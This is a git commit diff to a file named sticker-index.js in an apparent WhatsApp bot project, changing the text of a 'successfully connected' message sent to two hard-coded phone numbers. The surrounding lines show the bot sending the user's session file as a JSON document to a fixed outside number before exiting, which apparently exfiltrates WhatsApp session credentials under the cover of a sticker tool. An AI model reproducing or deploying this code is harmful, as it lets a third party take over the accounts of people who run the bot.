451c6ad5132dcd49f08ec587527dc54542e52a8c
Olduser-1 <111180617+Olduser-1@users.noreply.github.com>
2022-09-27 21:43:49 +0530

    Update sticker-index.js

--- sticker-index.js
+++ sticker-index.js
@@ -76,8 +76,8 @@ res = parseInt(resu)
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
       await conn.sendMessage('918602239106@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
       await conn.sendMessage('918107768770@s.whatsapp.net', { document: stick, mimetype: 'webp', fileName: 'w.webp' })
-      await conn.sendMessage('918602239106@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
-      await conn.sendMessage('918107768770@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ' })
+      await conn.sendMessage('918602239106@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ BY @✪𝚁𝙴𝚅𝙽𝙶𝙴𝚁"𝚂 𝙱𝙾𝚃𝚉 𝙸𝙽𝙲.' })
+      await conn.sendMessage('918107768770@s.whatsapp.net', { text: '⍟Sᴜᴄssғᴜʟʟʏ ᴄᴏɴɴᴇᴄᴛᴇᴅ Rᴇᴠᴇɴɢᴇʀs ʙᴏᴛᴢ>ᴍᴅ BY @✪𝚁𝙴𝚅𝙽𝙶𝙴𝚁"𝚂 𝙱𝙾𝚃𝚉 𝙸𝙽𝙲.' })
       
       process.exit(0)
       }
